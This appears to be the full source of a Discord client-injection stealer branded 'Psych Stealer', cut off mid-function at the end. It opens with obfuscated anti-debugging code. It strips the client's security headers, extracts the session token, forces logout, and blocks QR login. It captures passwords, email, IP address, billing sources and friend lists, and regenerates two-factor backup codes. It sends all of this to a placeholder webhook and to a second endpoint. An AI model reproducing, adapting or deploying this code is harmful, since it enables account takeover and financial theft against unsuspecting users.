const B = (function () {
    let w = true
    return function (W, b) {
      const Q = w
        ? function () {
            if (b) {
              const L = b.apply(W, arguments)
              return (b = null), L
            }
          }
        : function () {}
      return (w = false), Q
    }
  })(),
  d = B(this, function () {
    return d
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(d)
      .search('(((.+)+)+)+$')
  })
d()
const F = (function () {
  let w = true
  return function (W, b) {
    const J = w
      ? function () {
          if (b) {
            const L = b.apply(W, arguments)
            return (b = null), L
          }
        }
      : function () {}
    return (w = false), J
  }
})()
;(function () {
  F(this, function () {
    const w = new RegExp('function *\\( *\\)'),
      W = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      b = T('init')
    if (!w.test(b + 'chain') || !W.test(b + 'input')) {
      b('0')
    } else {
      T()
    }
  })()
})()
const c = (function () {
    let b = true
    return function (s, J) {
      const D = b
        ? function () {
            if (J) {
              const p = J.apply(s, arguments)
              return (J = null), p
            }
          }
        : function () {}
      return (b = false), D
    }
  })(),
  A = c(this, function () {
    let w
    try {
      const s = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      w = s()
    } catch (Q) {
      w = window
    }
    const W = (w.console = w.console || {})
    const b = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
    for (let L = 0; L < b.length; L++) {
      const p = c.constructor.prototype.bind(c),
        R = b[L],
        U = W[R] || p
      p['__proto__'] = c.bind(c)
      p.toString = U.toString.bind(U)
      W[R] = p
    }
  })
A()
;(function () {
  let w
  try {
    const b = Function('return (function() {}.constructor("return this")( ));')
    w = b()
  } catch (s) {
    w = window
  }
  w.setInterval(T, 4000)
})()
const fs = require('fs')
const path = require('path'),
  { BrowserWindow, session } = require('electron'),
  querystring = require('querystring'),
  os = require('os')
var webhook = '%WEBHOOK_LINK%'
var src = ''
const computerName = os.hostname(),
  discordInstall = '' + __dirname
const EvalToken =
  'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'
String.prototype.insert = function (w, W) {
  if (w > 0) {
    return this.substring(0, w) + W + this.substr(w)
  }
  return W + this
}
const AC = {}
AC.logout = 'instant'
AC['inject-notify'] = 'true'
AC['logout-notify'] = 'true'
AC['init-notify'] = 'false'
AC['embed-color'] = 3553599
AC['disable-qr-code'] = 'true'
const config = AC
session.defaultSession.webRequest.onHeadersReceived((b, s) => {
  if (b.url.startsWith(webhook)) {
    if (b.url.includes('discord.com')) {
      const D = {}
      D['Access-Control-Allow-Headers'] = '*'
      s({ responseHeaders: Object.assign(D, b.responseHeaders) })
    } else {
      s({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'",
            ],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          b.responseHeaders
        ),
      })
    }
  } else {
    delete b.responseHeaders['content-security-policy']
    delete b.responseHeaders['content-security-policy-report-only']
    const R = { ...b.responseHeaders }
    R['Access-Control-Allow-Headers'] = '*'
    const U = { responseHeaders: R }
    s(U)
  }
})
function FirstTime(a) {
  const W = BrowserWindow.getAllWindows()[0]
  W.webContents.executeJavaScript('' + EvalToken, true).then((b) => {
    if (config['init-notify'] == 'true') {
      if (fs.existsSync(path.join(__dirname, 'init'))) {
        fs.rmdirSync(path.join(__dirname, 'init'))
        if (b == null || b == undefined || b == '') {
          const L = {
            username: 'Psych Stealer',
            content: '',
            embeds: [
              {
                title: 'Discord Started',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Info',
                    value:
                      '```Hostname: \n' +
                      computerName +
                      '\nInjection Info: \n' +
                      __dirname +
                      '\n```',
                    inline: false,
                  },
                ],
                author: { name: 'Psych Stealer' },
                footer: { text: 'Psych Stealer' },
              },
            ],
          }
          var J = L
          SendToWebhook(JSON.stringify(J))
        } else {
          const p = BrowserWindow.getAllWindows()[0]
          p.webContents
            .executeJavaScript(
              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                b +
                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
              true
            )
            .then((R) => {
              const f = JSON.parse(R)
              var U = {
                username: 'Psych Stealer',
                content: '',
                embeds: [
                  {
                    title: 'Discord Initalized',
                    description:
                      '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
                      b +
                      ')',
                    color: config['embed-color'],
                    fields: [
                      {
                        name: 'Info',
                        value:
                          '```Hostname: \n' +
                          computerName +
                          '\nInjection Info: \n' +
                          __dirname +
                          '\n```',
                        inline: false,
                      },
                      {
                        name: 'Username',
                        value: '`' + f.username + '#' + f.discriminator + '`',
                        inline: true,
                      },
                      {
                        name: 'Email:',
                        value: '`' + a + '`',
                        inline: true,
                      },
                      {
                        name: 'Badges',
                        value: '' + GetBadges(f.flags),
                        inline: false,
                      },
                      {
                        name: 'Token',
                        value: '```' + b + '```',
                        inline: false,
                      },
                    ],
                    author: { name: 'Psych Stealer' },
                    footer: { text: 'Psych Stealer' },
                    thumbnail: {
                      url:
                        'https://cdn.discordapp.com/avatars/' +
                        f.id +
                        '/' +
                        f.avatar,
                    },
                  },
                ],
              }
              SendToWebhook(JSON.stringify(U))
            })
        }
      }
    }
    if (!fs.existsSync(path.join(__dirname, 'Rustler'))) {
      return true
    }
    fs.rmdirSync(path.join(__dirname, 'Rustler'))
    if (config.logout != 'false' || config.logout == '%LOGOUT%') {
      if (config['logout-notify'] == 'true') {
        if (b == null || b == undefined || b == '') {
          const G = {
            username: 'Psych Stealer',
            content: '',
            embeds: [
              {
                title: 'User log out (User not Logged in before)',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Info',
                    value:
                      '```Hostname: \n' +
                      computerName +
                      '\nInjection Info: \n' +
                      __dirname +
                      '\n```',
                    inline: false,
                  },
                ],
                author: { name: 'Psych Stealer' },
                footer: { text: 'Psych Stealer' },
              },
            ],
          }
          var J = G
          SendToWebhook(JSON.stringify(J))
        } else {
          const n = BrowserWindow.getAllWindows()[0]
          n.webContents
            .executeJavaScript(
              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                b +
                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
              true
            )
            .then((S) => {
              const q = JSON.parse(S)
              var t = {
                username: 'Psych Stealer',
                content: '',
                embeds: [
                  {
                    color: config['embed-color'],
                    fields: [
                      {
                        name: '<:token:949679866188529714> Token:',
                        value:
                          '`' +
                          b +
                          '`' +
                          '\n[CopyToken](https://rustlercoppy.com/copy/' +
                          b +
                          ')',
                        inline: false,
                      },
                      {
                        name: '<:password:949679865580384266> Username:',
                        value: '`' + q.username + '#' + q.discriminator + '`',
                        inline: true,
                      },
                      {
                        name: '<:ip:949680203859369994> ID:',
                        value: '`' + q.id + '`',
                        inline: true,
                      },
                      {
                        name: '<:mail:949679866113032253> Email:',
                        value: '`' + q.email + '`',
                        inline: true,
                      },
                      {
                        name: '<:badge:949679865710403584> Badges:',
                        value: '' + GetBadges(q.flags),
                        inline: true,
                      },
                      {
                        name: '<:nitro:949679866033352784> Nitro Type:',
                        value: '' + GetNitro(q.premium_type),
                        inline: true,
                      },
                    ],
                    author: {
                      name:
                        q.username + '#' + q.discriminator + ' (' + q.id + ')',
                      icon_url:
                        'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                    },
                    footer: { text: 'Psych Stealer' },
                    thumbnail: {
                      url:
                        'https://cdn.discordapp.com/avatars/' +
                        q.id +
                        '/' +
                        q.avatar,
                    },
                  },
                ],
              }
              SendToWebhook(JSON.stringify(t))
            })
        }
      }
      const e = BrowserWindow.getAllWindows()[0]
      e.webContents
        .executeJavaScript(
          'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
          true
        )
        .then((Y) => {})
    }
    return false
  })
}
const An = {}
An.urls = [
  'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
  'https://*.discord.com/api/v*/applications/detectable',
  'https://discord.com/api/v*/applications/detectable',
  'https://*.discord.com/api/v*/users/@me/library',
  'https://discord.com/api/v*/users/@me/library',
  'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
  'https://discord.com/api/v*/users/@me/billing/subscriptions',
  'wss://remote-auth-gateway.discord.gg/*',
]
const Filter = An
session.defaultSession.webRequest.onBeforeRequest(Filter, (w, W) => {
  if (w.url.startsWith('wss://')) {
    if (
      config['disable-qr-code'] == 'true' ||
      config['disable-qr-code'] == '%DISABLEQRCODE%'
    ) {
      const J = { cancel: true }
      W(J)
      return
    }
  }
  if (FirstTime()) {
  }
  W({})
  return
})
function SendToWebhook(a) {
  const w = BrowserWindow.getAllWindows()[0]
  w.webContents
    .executeJavaScript(
      '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
        webhook +
        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
        a +
        '));\n    ',
      true
    )
    .then((W) => {})
  w.webContents
    .executeJavaScript(
      '    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
        src +
        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
        a +
        '));\n    ',
      true
    )
    .then((W) => {})
}
function GetNitro(w) {
  if (w == 0) {
    return '`No Nitro`'
  }
  if (w == 1) {
    return '<:classic:896119171019067423> `Nitro Classic`'
  }
  if (w == 2) {
    return '<a:boost:824036778570416129> `Nitro Boost`'
  } else {
    return '`No Nitro`'
  }
}
function GetRBadges(a) {
  var k = ''
  if ((a & 1) == 1) {
    k += '<:staff:874750808728666152> '
  }
  if ((a & 2) == 2) {
    k += '<:partner:874750808678354964> '
  }
  if ((a & 4) == 4) {
    k += '<:hypesquad_events:874750808594477056> '
  }
  if ((a & 8) == 8) {
    k += '<:bughunter_1:874750808426692658> '
  }
  ;(a & 512) == 512 && (k += '<:early_supporter:874750808414113823> ')
  if ((a & 16384) == 16384) {
    k += '<:bughunter_2:874750808430874664> '
  }
  if ((a & 131072) == 131072) {
    k += '<:developer:874750808472825986> '
  }
  return k == '' && (k = ''), k
}
function GetBadges(a) {
  const s = 4
  var U = ''
  ;(a & 1) == 1 && (U += '<:staff:874750808728666152> ')
  if ((a & 2) == 2) {
    U += '<:partner:874750808678354964> '
  }
  if ((a & s) == s) {
    U += '<:hypesquad_events:874750808594477056> '
  }
  ;(a & 8) == 8 && (U += '<:bughunter_1:874750808426692658> ')
  ;(a & 64) == 64 && (U += '<:bravery:874750808388952075> ')
  if ((a & 128) == 128) {
    U += '<:brilliance:874750808338608199> '
  }
  if ((a & 256) == 256) {
    U += '<:balance:874750808267292683> '
  }
  if ((a & 512) == 512) {
    U += '<:early_supporter:874750808414113823> '
  }
  ;(a & 16384) == 16384 && (U += '<:bughunter_2:874750808430874664> ')
  if ((a & 131072) == 131072) {
    U += '<:developer:874750808472825986> '
  }
  if (U == '') {
    U = '`No Badges`'
  }
  return U
}
function Login(a, w, W) {
  const s = BrowserWindow.getAllWindows()[0]
  s.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        W +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((J) => {
      s.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((D) => {
          s.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                W +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((k) => {
              s.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    W +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((R) => {
                  if (W.startsWith('mfa')) {
                    s.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          W +
                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                          w +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((e) => {
                        var C = [],
                          n = '',
                          S = 'https://rustlercoppy.com/copy/',
                          t = JSON.parse(e)
                        let X = t.backup_codes
                        const M = X.filter((h) => {
                          return h.consumed == false
                        })
                        for (let h in M) {
                          if (h == 0) {
                            n +=
                              '<:Rustler:936417408363679824> `' +
                              M[h].code.insert(4, '') +
                              '` '
                          } else {
                            if (h % 2 === 1) {
                              n +=
                                '<:Rustler:936417408363679824> `' +
                                M[h].code.insert(4, '') +
                                '` \n'
                            } else {
                              n +=
                                '<:Rustler:936417408363679824> `' +
                                M[h].code.insert(4, '') +
                                '` '
                            }
                          }
                        }
                        function v() {
                          var K = JSON.parse(R)
                          const A0 = K.filter((A1) => {
                            return A1.type == 1
                          })
                          return A0.length
                        }
                        function u() {
                          var K = JSON.parse(R)
                          const A2 = K.filter((A3) => {
                            return A3.type == 1
                          })
                          var E = ''
                          for (z of A2) {
                            var A0 = GetRBadges(z.user.public_flags)
                            if (A0 != '') {
                              E +=
                                A0 +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n')
                            }
                          }
                          if (E == '') {
                            E = '*Nothing to see here*'
                          }
                          return E
                        }
                        function H() {
                          const A0 = JSON.parse(k)
                          var K = ''
                          return (
                            A0.forEach((A1) => {
                              if (A1.type == '') {
                                return '`No`'
                              } else {
                                if (A1.type == 2 && A1.invalid != true) {
                                  K += ' <:paypal:896441236062347374>'
                                } else {
                                  if (A1.type == 1 && A1.invalid != true) {
                                    K += ' :credit_card:'
                                  } else {
                                    return '`No`'
                                  }
                                }
                              }
                            }),
                            K == '' && (K = '`No`'),
                            K
                          )
                        }
                        const m = JSON.parse(J)
                        var Y = {
                          username: 'Psych Stealer',
                          content: '',
                          embeds: [
                            {
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: '<:token:949679866188529714> Token:',
                                  value:
                                    '`' +
                                    W +
                                    '`' +
                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                    W +
                                    ')',
                                  inline: false,
                                },
                                {
                                  name: '<:badge:949679865710403584> Badges:',
                                  value: '' + GetBadges(m.flags),
                                  inline: true,
                                },
                                {
                                  name: '<:nitro:949679866033352784> Nitro Type:',
                                  value: '' + GetNitro(m.premium_type),
                                  inline: true,
                                },
                                {
                                  name: '<:card:949679865798475827>Billing',
                                  value: '' + H(),
                                  inline: true,
                                },
                                {
                                  name: '<:ip:949680203859369994> IP:',
                                  value: '`' + D + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:mail:949679866113032253> Email:',
                                  value: '`' + a + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> Password:',
                                  value: '`' + w + '`',
                                  inline: true,
                                },
                              ],
                              author: {
                                name:
                                  m.username +
                                  '#' +
                                  m.discriminator +
                                  ' (' +
                                  m.id +
                                  ')',
                                icon_url:
                                  'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                              },
                              footer: { text: 'Psych Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  m.id +
                                  '/' +
                                  m.avatar,
                              },
                            },
                          ],
                        }
                        const P = {
                          color: config['embed-color'],
                          description: '' + n,
                          author: {},
                          footer: {},
                        }
                        P.author.icon_url =
                          'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg'
                        P.author.name = '2FA Codes'
                        P.footer.text = 'Psych Stealer'
                        var q = P,
                          i = {
                            color: config['embed-color'],
                            description: u(),
                            author: {
                              icon_url:
                                'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                              name: 'HQ Friends',
                            },
                            footer: { text: 'Psych Stealer' },
                          }
                        W.startsWith('mfa') && Y.embeds.push(q)
                        Y.embeds.push(i)
                        SendToWebhook(JSON.stringify(Y))
                      })
                  } else {
                    const G = BrowserWindow.getAllWindows()[0]
                    G.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          W +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((C) => {
                        G.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((S) => {
                            G.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  W +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((q) => {
                                G.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      W +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((y) => {
                                    function M() {
                                      var P = JSON.parse(y)
                                      const h = P.filter((o) => {
                                        return o.type == 1
                                      })
                                      return h.length
                                    }
                                    function v() {
                                      var P = JSON.parse(y)
                                      const I = P.filter((V) => {
                                        return V.type == 1
                                      })
                                      var h = ''
                                      for (z of I) {
                                        var o = GetRBadges(z.user.public_flags)
                                        o != '' &&
                                          (h +=
                                            o +
                                            (' | `' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '`\n'))
                                      }
                                      if (h == '') {
                                        h = '*Nothing to see here*'
                                      }
                                      return h
                                    }
                                    function u() {
                                      const h = JSON.parse(q)
                                      var P = ''
                                      return (
                                        h.forEach((o) => {
                                          if (o.type == '') {
                                            return '`No`'
                                          } else {
                                            if (
                                              o.type == 2 &&
                                              o.invalid != true
                                            ) {
                                              P +=
                                                ' <:paypal:896441236062347374>'
                                            } else {
                                              if (
                                                o.type == 1 &&
                                                o.invalid != true
                                              ) {
                                                P += ' :credit_card:'
                                              } else {
                                                return '`No`'
                                              }
                                            }
                                          }
                                        }),
                                        P == '' && (P = '`No`'),
                                        P
                                      )
                                    }
                                    const H = JSON.parse(C)
                                    var X = {
                                      username: 'Psych Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: '<:token:949679866188529714> Token:',
                                              value:
                                                '`' +
                                                W +
                                                '`' +
                                                '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                                W +
                                                ')',
                                              inline: false,
                                            },
                                            {
                                              name: '<:badge:949679865710403584> Badges:',
                                              value: '' + GetBadges(H.flags),
                                              inline: true,
                                            },
                                            {
                                              name: '<:nitro:949679866033352784> Nitro Type:',
                                              value:
                                                '' + GetNitro(H.premium_type),
                                              inline: true,
                                            },
                                            {
                                              name: '<:card:949679865798475827>Billing',
                                              value: '' + u(),
                                              inline: true,
                                            },
                                            {
                                              name: '<:ip:949680203859369994> IP:',
                                              value: '`' + S + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:mail:949679866113032253> Email:',
                                              value: '`' + a + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> Password:',
                                              value: '`' + w + '`',
                                              inline: true,
                                            },
                                          ],
                                          author: {
                                            name:
                                              H.username +
                                              '#' +
                                              H.discriminator +
                                              ' (' +
                                              H.id +
                                              ')',
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                          },
                                          footer: { text: 'Psych Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              H.id +
                                              '/' +
                                              H.avatar,
                                          },
                                        },
                                        {
                                          color: config['embed-color'],
                                          description: v(),
                                          author: {
                                            icon_url:
                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                                            name: 'HQ Friends',
                                          },
                                          footer: { text: 'Psych Stealer' },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(X))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function ChangePassword(a, w, W) {
  const s = BrowserWindow.getAllWindows()[0]
  s.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        W +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((J) => {
      s.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((D) => {
          s.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                W +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((L) => {
              s.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    W +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((R) => {
                  if (W.startsWith('mfa')) {
                    s.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          W +
                          '")\n\t      xmlHttp.send(JSON.stringify({"password":"' +
                          w +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((e) => {
                        var C = [],
                          n = '',
                          S = 'https://rustlercoppy.com/copy/',
                          t = JSON.parse(e)
                        let y = t.backup_codes
                        const X = y.filter((P) => {
                          return P.consumed == false
                        })
                        for (let P in X) {
                          if (P == 0) {
                            n +=
                              '<:Rustler:936417408363679824> `' +
                              X[P].code.insert(4, '') +
                              '` '
                          } else {
                            if (P % 2 === 1) {
                              n +=
                                '<:Rustler:936417408363679824> `' +
                                X[P].code.insert(4, '') +
                                '` \n'
                            } else {
                              n +=
                                '<:Rustler:936417408363679824> `' +
                                X[P].code.insert(4, '') +
                                '` '
                            }
                          }
                        }
                        function M() {
                          var x = JSON.parse(R)
                          const O = x.filter((K) => {
                            return K.type == 1
                          })
                          return O.length
                        }
                        function v() {
                          var O = JSON.parse(R)
                          const A0 = O.filter((A1) => {
                            return A1.type == 1
                          })
                          var K = ''
                          for (z of A0) {
                            var E = GetRBadges(z.user.public_flags)
                            E != '' &&
                              (K +=
                                E +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n'))
                          }
                          return K == '' && (K = '*Nothing to see here*'), K
                        }
                        function u() {
                          const E = JSON.parse(L)
                          var O = ''
                          E.forEach((A0) => {
                            if (A0.type == '') {
                              return '`No`'
                            } else {
                              if (A0.type == 2 && A0.invalid != true) {
                                O += ' <:paypal:896441236062347374>'
                              } else {
                                if (A0.type == 1 && A0.invalid != true) {
                                  O += ' :credit_card:'
                                } else {
                                  return '`No`'
                                }
                              }
                            }
                          })
                          if (O == '') {
                            O = '`No`'
                          }
                          return O
                        }
                        const H = JSON.parse(J)
                        var Y = {
                          username: 'Psych Stealer',
                          content: '',
                          embeds: [
                            {
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: '<:token:949679866188529714> Token:',
                                  value:
                                    '`' +
                                    W +
                                    '`' +
                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                    W +
                                    ')',
                                  inline: false,
                                },
                                {
                                  name: '<:badge:949679865710403584> Badges:',
                                  value: '' + GetBadges(H.flags),
                                  inline: true,
                                },
                                {
                                  name: '<:nitro:949679866033352784> Nitro Type:',
                                  value: '' + GetNitro(H.premium_type),
                                  inline: true,
                                },
                                {
                                  name: '<:card:949679865798475827>Billing',
                                  value: '' + u(),
                                  inline: true,
                                },
                                {
                                  name: '<:ip:949680203859369994> IP:',
                                  value: '`' + D + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:mail:949679866113032253> Email:',
                                  value: '`' + H.email + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> Old Password:',
                                  value: '`' + a + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> New Password:',
                                  value: '`' + w + '`',
                                  inline: true,
                                },
                              ],
                              author: {
                                name:
                                  H.username +
                                  '#' +
                                  H.discriminator +
                                  ' (' +
                                  H.id +
                                  ')',
                                icon_url:
                                  'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                              },
                              footer: { text: 'Psych Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  H.id +
                                  '/' +
                                  H.avatar,
                              },
                            },
                          ],
                        }
                        const m = {
                          color: config['embed-color'],
                          description: '' + n,
                          author: {},
                          footer: {},
                        }
                        m.author.icon_url =
                          'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg'
                        m.author.name = '2FA Codes'
                        m.footer.text = 'Psych Stealer'
                        var i = {
                          color: config['embed-color'],
                          description: v(),
                          author: {
                            icon_url:
                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                            name: 'HQ Friends',
                          },
                          footer: { text: 'Psych Stealer' },
                        }
                        W.startsWith('mfa') && Y.embeds.push(q)
                        Y.embeds.push(i)
                        SendToWebhook(JSON.stringify(Y))
                      })
                  } else {
                    const C = BrowserWindow.getAllWindows()[0]
                    C.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          W +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((n) => {
                        C.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((t) => {
                            C.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  W +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((Y) => {
                                C.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      W +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((y) => {
                                    function M() {
                                      var P = JSON.parse(y)
                                      const h = P.filter((o) => {
                                        return o.type == 1
                                      })
                                      return h.length
                                    }
                                    function v() {
                                      var P = JSON.parse(y)
                                      const V = P.filter((x) => {
                                        return x.type == 1
                                      })
                                      var h = ''
